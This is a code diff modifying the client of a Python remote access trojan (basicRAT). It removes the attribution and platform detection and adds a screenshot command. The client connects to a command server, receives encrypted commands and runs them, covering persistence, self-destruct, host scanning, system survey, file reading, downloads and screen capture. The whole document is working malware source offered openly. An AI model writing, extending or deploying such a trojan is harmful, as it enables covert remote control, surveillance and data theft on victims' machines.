@@ -1,9 +1,6 @@
 #!/usr/bin/env python
 
-#
-# basicRAT client
-# https://github.com/vesche/basicRAT
-#
+#Rat
 
 import socket
 import sys
@@ -12,33 +9,22 @@ import time
 from core import *
 
 
-# change these to suit your needs
+# change host you need
 HOST = 'localhost'
 PORT = 1337
 
-# seconds to wait before client will attempt to reconnect
+# seconds to wait b
 CONN_TIMEOUT = 30
-
-# determine system platform
-if sys.platform.startswith('win'):
-    PLAT = 'win'
-elif sys.platform.startswith('linux'):
-    PLAT = 'nix'
-elif sys.platform.startswith('darwin'):
-    PLAT = 'mac'
-else:
-    print 'This platform is not supported.'
-    sys.exit(1)
 
 
 def client_loop(conn, dhkey):
     while True:
         results = ''
 
-        # wait to receive data from server
+        # receive data from server
         data = crypto.decrypt(conn.recv(4096), dhkey)
 
-        # seperate data into command and action
+        # seperate data
         cmd, _, action = data.partition(' ')
 
         if cmd == 'kill':
@@ -47,7 +33,7 @@ def client_loop(conn, dhkey):
 
         elif cmd == 'selfdestruct':
             conn.close()
-            toolkit.selfdestruct(PLAT)
+            toolkit.selfdestruct()
 
         elif cmd == 'quit':
             conn.shutdown(socket.SHUT_RDWR)
@@ -55,13 +41,13 @@ def client_loop(conn, dhkey):
             break
 
         elif cmd == 'persistence':
-            results = persistence.run(PLAT)
+            results = persistence.run()
 
         elif cmd == 'scan':
             results = scan.single_host(action)
 
         elif cmd == 'survey':
-            results = survey.run(PLAT)
+            results = survey.run()
 
         elif cmd == 'cat':
             results = toolkit.cat(action)
@@ -80,6 +66,10 @@ def client_loop(conn, dhkey):
 
         elif cmd == 'wget':
             results = toolkit.wget(action)
+
+        elif cmd == 'screenshot':
+
+            results = toolkit.screenshot()
 
         results = results.rstrip() + '\n{} completed.'.format(cmd)
 
